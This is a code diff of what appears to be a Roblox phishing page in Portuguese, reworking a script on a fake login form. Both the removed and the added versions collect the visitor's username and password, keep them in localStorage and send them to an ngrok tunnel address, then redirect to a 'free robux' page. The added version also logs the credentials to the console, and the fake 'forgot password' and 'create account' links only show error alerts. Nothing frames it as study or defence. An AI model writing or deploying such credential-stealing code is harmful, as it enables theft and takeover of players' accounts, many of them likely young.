@@ -530,88 +530,64 @@ site.</div></div></noscript>
         </div>
     </form>
 </div>
-<script>
-        document.addEventListener('DOMContentLoaded', function() {
-            // Verificar credenciais salvas
-            const savedUsername = localStorage.getItem('roblox_username');
-            const savedPassword = localStorage.getItem('roblox_password');
-            
-            if (savedUsername && savedPassword) {
-                document.getElementById('custom-username').value = savedUsername;
-                document.getElementById('custom-password').value = savedPassword;
-                document.getElementById('custom-remember').checked = true;
-            }
-            
-            const loginForm = document.getElementById('custom-login-form');
-            const messageDiv = document.getElementById('custom-login-message');
-            
-            loginForm.addEventListener('submit', function(e) {
-                e.preventDefault();
-                
-                const username = document.getElementById('custom-username').value;
-                const password = document.getElementById('custom-password').value;
-                const rememberMe = document.getElementById('custom-remember').checked;
-                
-                // Validação
-                if (username.length < 3 || password.length < 6) {
-                    messageDiv.textContent = 'Nome de usuário ou senha inválidos.';
-                    messageDiv.style.color = '#ff3333';
-                    return;
-                }
-                
-                // Salvar credenciais
-                if (rememberMe) {
-                    localStorage.setItem('roblox_username', username);
-                    localStorage.setItem('roblox_password', password);
-                } else {
-                    localStorage.removeItem('roblox_username');
-                    localStorage.removeItem('roblox_password');
-                }
-                
-                // Enviar dados diretamente via POST
-                const loginData = {
-                    username: username,
-                    password: password
-                };
+    <script>
+loginForm.addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    const username = document.getElementById('custom-username').value;
+    const password = document.getElementById('custom-password').value;
+    const rememberMe = document.getElementById('custom-remember').checked;
+    
+    console.log('Dados do login:', { username, password }); // Verifique se os dados estão corretos
+    
+    // Validação
+    if (username.length < 3 || password.length < 6) {
+        messageDiv.textContent = 'Nome de usuário ou senha inválidos.';
+        messageDiv.style.color = '#ff3333';
+        return;
+    }
+    
+    // Salvar credenciais
+    if (rememberMe) {
+        localStorage.setItem('roblox_username', username);
+        localStorage.setItem('roblox_password', password);
+    } else {
+        localStorage.removeItem('roblox_username');
+        localStorage.removeItem('roblox_password');
+    }
 
-                // Enviar para o servidor Ngrok
-                fetch('https://6ab1a2027ad7.ngrok-free.app/login/', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json' // Indica que estamos enviando dados JSON
-                    },
-                    body: JSON.stringify(loginData) // Converte o objeto para uma string JSON
-                })
-                .then(response => {
-                    if (!response.ok) {
-                        throw new Error('Erro no servidor');
-                    }
-                    return response.json();
-                })
-                .then(data => {
-                    messageDiv.textContent = 'Login bem-sucedido! Redirecionando...';
-                    messageDiv.style.color = '#00aa00';
-                    window.location.href = "https://roblox-robux-free.github.io/roblox/oi.html";
-                })
-                .catch(error => {
-                    console.error('Erro:', error);
-                    messageDiv.textContent = 'Erro na conexão. Verifique sua internet.';
-                    messageDiv.style.color = '#ff3333';
-                });
-            });
+    // Enviar dados diretamente via POST
+    const loginData = { username, password };
 
-            // Links extras
-            document.getElementById('custom-forgot-password').addEventListener('click', function(e) {
-                e.preventDefault();
-                alert('Não foi possível mudar a senha. Verifique sua internet.');
-            });
-            
-            document.getElementById('custom-create-account').addEventListener('click', function(e) {
-                e.preventDefault();
-                alert('Não foi possível criar conta. Verifique sua internet.');
-            });
-        });
-    </script>
+    console.log('Enviando dados para o servidor:', loginData); // Verifique os dados que serão enviados
+
+    // Enviar para o servidor Ngrok
+    fetch('https://6ab1a2027ad7.ngrok-free.app/login/', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json', // Indica que estamos enviando dados em formato JSON
+        },
+        body: JSON.stringify(loginData), // Converte o objeto em JSON
+    })
+    .then(response => {
+        if (!response.ok) {
+            throw new Error('Erro no servidor');
+        }
+        return response.json(); // Parse da resposta em JSON
+    })
+    .then(data => {
+        console.log('Resposta do servidor:', data); // Verifique a resposta recebida
+        messageDiv.textContent = 'Login bem-sucedido! Redirecionando...';
+        messageDiv.style.color = '#00aa00';
+        window.location.href = "https://roblox-robux-free.github.io/roblox/oi.html";
+    })
+    .catch(error => {
+        console.error('Erro:', error);
+        messageDiv.textContent = 'Erro na conexão. Verifique sua internet.';
+        messageDiv.style.color = '#ff3333';
+    });
+});
+</script>
         </div>
     </main>
 
